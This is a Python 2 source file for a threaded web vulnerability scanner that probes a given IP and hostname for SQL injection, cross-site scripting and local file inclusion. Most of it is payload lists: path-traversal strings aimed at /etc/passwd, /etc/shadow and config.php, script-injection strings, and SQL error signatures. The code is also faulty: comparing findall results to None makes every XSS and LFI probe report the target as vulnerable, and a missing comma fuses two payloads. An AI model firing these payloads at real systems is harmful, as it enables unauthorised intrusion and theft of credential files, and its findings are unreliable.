#!/usr/bin/env python
# -*- encoding: utf-8 -*-

#class for check SQL injection , XSS and LFI

import socket
import sys
import urllib
import httplib
import re
import urllib2
import requests
import threading
import Queue


lfi_array = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd","../","../../../../../../../../../../../../etc/hosts","../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../etc/shadow","..\%20\..\%20\..\%20\../etc/passwd","..\..\..\..\..\..\..\..\..\..\etc\passwd",
            "....//....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/hosts",
            "..\..\..\..\..\..\..\..\..\..\etc\group",".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow",
            "/","../%00/","/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..",
            "../%2A","/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..//..//..//..//..//../etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group","..//..//..//..//..//..//..//etc//passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/&apos;","/\,%ENV\,/","/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd","/.../.../.../.../.../%0a",
            "/../../../../../../../../%2A","/../../../../../../../../../../etc/passwd","..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2fetc%2f%2fpasswd",
            "/../../../../../../../../../../etc/passwd^^","/../../../../../../../../../../etc/group","../\../\../\../\../\../\../\etc/\passwd",
            "/../../../../../../../../../../etc/shadow^^","/../../../../../../../../bin/id|","...//...//...//...//...//...//etc//passwd",
            "/..\../..\../..\../..\../..\../..\../etc/passwd","/..\../..\../..\../..\../..\../..\../etc/shadow","../\.../\.../\.../\.../\.../\.../\etc/\passwd",
            "/./././././././././././etc/passwd","/./././././././././././etc/shadow","/./././././././././././etc/group",".../.../.../.../.../.../etc/passwd",
            "\.\.\.\.\.\.\.\.\etc\passwd","\.\.\.\.\.\.\.\.\etc\group","/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
            "/%00//%00//%00//%00//%00/etc/passwd","/%00//%00//%00//%00//%00/etc/passwd","/%00//%00//%00//%00//%00//etc//shadow",
            "/%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../etc/passwd","/%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../%2e%2e\../etc/shadow",
            "..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63","..%%35c..%%35c..%%35c..%%35c..%%35c..%%35c","..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cgroup"
            "..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63etc%25%35%63passwd","..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd","..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd","..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cgroup",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cshadow","..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qf","..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc%bg%qfpasswd",
            "..%bg%qf..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc%bg%qfgroup","..%bg%qf..%bg%qf..%bg%qf..%bg%qfetc/passwd","../\.../\.../\.../\.../\.../\.../etc/passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af","..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af",
            "..%u2215..%u2215..%u2215..%u2215..%u2215","..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215shadow",".%5c../..%5c/..%c0%9v..%5c.%5c../..%5c/..%c0%9v../",
            "..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215group","..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd",
            "..%255c",".%5c../..%5c","/..%c0%9v../","/..%c0%af../","/..%255c..%255c","/..%c0%af..//..%c0%af..//..%c0%af../",
            "/..%255c..%255c/..%255c..%255c/..%255c..%255c","..%255c",".%5c../..%5c/..%c0%9v../","..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd",
            "..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216hosts","..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216shadow","./\./\./\./\./\./\./etc/hosts",
            "../\./\./\./\./\./\./\etc/\passwd","../\./\./\./\./\./\./\proc/\self/\fd/\1","..//..//..//..//..//config.php","..\/..\/..\/..\/config.php",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5config.php","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afconfig.php","..%25%35%63..%25%35%63..%25%35%63config.php",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2econfig.php"]

xss_array = ["%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
         "<script>alert(\"XSS\")</script>",
         "%3Ch1%3EXSS%3C/h1%3E",
         "<h1>XSS</h1>",
         "\"><script>alert(\"XSS\")</script>",
         "%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
         "</script><script>alert(\"XSS\")</script>",
         "%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
         "\"/><script>alert(\"XSS\")</script>",
         "%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
         "'/><script>alert(\"XSS\")</script>",
         "'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
         "</SCRIPT>\"><SCRIPT>alert(\"XSS\")</SCRIPT>",
         "%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E",
         "</SCRIPT>\">\"><SCRIPT>alert(\"XSS\")</SCRIPT>",
         "%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E",
         "\";alert(\"XSS\");\"","%22;alert(%22XSS%22);%22",
         "';alert(\"XSS\");'",
         "';alert(%22XSS%22);'",
         "\";alert(\"XSS\")",
         "%22;alert(%22XSS%22)",
         "';alert(\"XSS\")",
         "';alert(%22XSS%22)"]


sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'SQL command net properly ended': 'SQL command net properly ended',
             'query failed:': 'query failed:',             
	     'PostgreSQL': 'postgresql.util',
	     'JDBC': 'oracle.jdbc.',
             'JDBC': 'atoracle.jdbc.',
	     'JDBC': 'system.data.oledb'
             }


CONCURRENCY = 5
    
class CheckVuln_SQL_XSS_LFI():

    def __init__(self):
	self.threads = []
    
    def checkSQLVulnerability(self,host,sem):
	vulnerable = False	
	EXT = "'"
		
	if host.startswith("http://") == False:
	    host = "http://" + host + "/"	
	try:
	    source = requests.get(host+EXT, timeout=5).text
	    #request_web = urllib2.Request(host+EXT)
	    #request_web.add_header('User-Agent', headers)
	    #text = urllib2.urlopen(request_web)
	    #source = text.read()
	    print source
	    for type,eMSG in sqlerrors.items():
		if re.search(eMSG, source, re.I) != None:
		    vulnerable = True
		    print "[!] SQL Vulnerable :", host +" "+ eMSG + " " +type
	except Exception, e:
	    print e
		
	if vulnerable == False :
		    print "[-] Not SQL Vulnerable"
	
	sem.release()
	
    def checkXSSVulnerability(self,host,sem):
	vulnerable = False
		
	if host.startswith("http://") == False:
	    host = "http://" + host + "/"
		    
	for xss in xss_array:
	    try:
		#source = urllib2.urlopen(host+xss.replace("\n","")).read()
		print host+xss.replace("\n","")
		source = requests.get(host+xss.replace("\n","") , timeout=5).text
		if re.findall("XSS", source, re.I) != None:
		    vulnerable = True
		    print "[!] XSS Vulnerable :", host + xss
	    except Exception, e:
		print e
		continue
		    
	if vulnerable == False :
	    print "[-] Not XSS Vulnerable"
	    
	sem.release()
	
    def checkLFIVulnerability(self,host,sem):
	vulnerable = False
			    
	if host.startswith("http://") == False:
	    host = "http://" + host + "/"
				
	lfiurl = host.rsplit('=', 1)[0]
	if lfiurl[-1] != "=":
	    lfiurl = lfiurl + "="	
	
	print lfiurl
		
	for lfi in lfi_array:
	    try:
		source = requests.get(lfiurl+lfi.replace("\n","") , timeout=5).text
		if re.findall("root:x", source, re.I) != None:
		    vulnerable = True
		    print "[!] LFI Vulnerable :", host + lfi
		if re.findall("failed to open stream: No such file or directory", source, re.I) != None:
		    vulnerable = True
		    print "[!] LFI Vulnerable :", host + lfi		
	    except Exception, e:
		print e
		continue
		    
	if vulnerable == False :
	    print "[-] Not LFI Vulnerable"
	    
	sem.release()
		    
		    
    def startCheckVulnerability(self,ip,hostname):
        try:
            print '\n###### Started scanning for checkSQLVulnerability \'%s\' ######\n' % (ip)
            
	    sem = threading.BoundedSemaphore(value=CONCURRENCY)
	    thread = threading.Thread(target=self.checkSQLVulnerability, args=(ip, sem, ))
	    
	    self.threads.append(thread)
	   
	    thread.start()
	   
	    sem.acquire()	    
            
	    print '\n###### Started scanning for checkSQLVulnerability \'%s\' ######\n' % (hostname)
                                       
	    thread = threading.Thread(target=self.checkSQLVulnerability, args=(hostname, sem, ))
			
	    self.threads.append(thread)
		       
	    thread.start()
		       
	    sem.acquire()                             

	    print '\n###### Started scanning for checkXSSVulnerability \'%s\' ######\n' % (ip)
				       
	    thread = threading.Thread(target=self.checkXSSVulnerability, args=(ip, sem, ))
			
	    self.threads.append(thread)
		       
	    thread.start()
		       
	    sem.acquire()  
			   
	    print '\n###### Started scanning for checkXSSVulnerability \'%s\' ######\n' % (hostname)
						  
	    thread = threading.Thread(target=self.checkXSSVulnerability, args=(hostname, sem, ))
			
	    self.threads.append(thread)
		       
	    thread.start()
		       
	    sem.acquire()  
	    
	    print '\n###### Started scanning for checkLFIVulnerability \'%s\' ######\n' % (ip)
						   
	    thread = threading.Thread(target=self.checkLFIVulnerability, args=(ip, sem, ))
			
	    self.threads.append(thread)
		       
	    thread.start()
		       
	    sem.acquire() 
				       
	    print '\n###### Started scanning for checkLFIVulnerability \'%s\' ######\n' % (hostname)
							      
	    thread = threading.Thread(target=self.checkLFIVulnerability, args=(ip, sem, ))
			
	    self.threads.append(thread)
		       
	    thread.start()
		       
	    sem.acquire() 
	    
	    for x in self.threads:
		x.join()  	    
            
        except Exception, e:
                print 'Error connecting: %s' % e
        except socket.timeout:
                print 'Error connecting Timeouterror: %s' % e
